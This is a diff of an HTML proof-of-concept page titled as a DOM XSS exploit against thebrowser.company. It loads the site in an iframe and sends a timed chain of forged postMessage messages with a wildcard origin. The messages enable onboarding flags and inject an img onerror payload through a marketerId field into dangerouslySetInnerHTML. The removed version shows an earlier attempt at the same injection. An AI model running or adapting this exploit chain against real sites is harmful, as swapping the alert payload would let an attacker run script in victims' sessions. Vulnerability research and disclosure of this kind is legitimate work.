@@ -1,29 +1,72 @@
 <!DOCTYPE html>
-<html>
-<head><title>💥 Build XSS manually</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>🔥 XSS PoC - thebrowser.company</title>
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+    iframe { border: 2px solid #0f0; width: 100%; height: 600px; margin-top: 20px; }
+  </style>
+</head>
 <body>
+  <h2>☠️ DOM XSS Exploit - Final Chain</h2>
+  <p>✅ This exploit uses <code>postMessage</code> to bypass React conditions and trigger <code>dangerouslySetInnerHTML</code>.</p>
+  <iframe id="target" src="https://thebrowser.company" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
 
-<h2>💣 تفجير الثغرة يدويًا</h2>
-<iframe id="target" src="https://thebrowser.company" width="100%" height="600"></iframe>
+  <script>
+    const iframe = document.getElementById("target");
+    const payload = `<img src=x onerror="alert('🔥 XSS Confirmed from GitHub PoC')">`;
 
-<script>
-  const payload = {
-    props: {
-      dangerouslySetInnerHTML: {
-        __html: `<script>alert('🔥 XSS BUILT')</script>`
+    const step0 = {
+      message: "OB_ENABLE_ALL",
+      content: {
+        __ONBOARDING_ALLOWED__: true,
+        OB_SESSION_STARTED: true,
+        OB_ONBOARDING_SESSION: true
       }
-    }
-  };
+    };
 
-  window.name = JSON.stringify(payload); // نضع البايلود في name لتجاوز القيود
+    const step1 = {
+      message: "OB_SHOW_PICKER"
+    };
 
-  const iframe = document.getElementById("target");
+    const step2 = {
+      message: "OB_SHOULD_SHOW_PICKER",
+      content: {
+        marketerId: [payload]
+      }
+    };
 
-  iframe.onload = () => {
-    console.log("✅ iframe ready, sending forged message");
-    iframe.contentWindow.postMessage(payload, "*");
-  };
-</script>
+    const step3 = {
+      message: "OB_OPEN_PICKER",
+      content: {
+        marketerId: [payload]
+      }
+    };
 
+    iframe.onload = () => {
+      console.log("✅ iframe loaded");
+
+      setTimeout(() => {
+        console.log("🔓 Step 0: OB_ENABLE_ALL");
+        iframe.contentWindow.postMessage(step0, "*");
+
+        setTimeout(() => {
+          console.log("🟡 Step 1: OB_SHOW_PICKER");
+          iframe.contentWindow.postMessage(step1, "*");
+
+          setTimeout(() => {
+            console.log("🟠 Step 2: OB_SHOULD_SHOW_PICKER");
+            iframe.contentWindow.postMessage(step2, "*");
+
+            setTimeout(() => {
+              console.log("🔴 Step 3: OB_OPEN_PICKER");
+              iframe.contentWindow.postMessage(step3, "*");
+            }, 800);
+          }, 800);
+        }, 800);
+      }, 800);
+    };
+  </script>
 </body>
 </html>
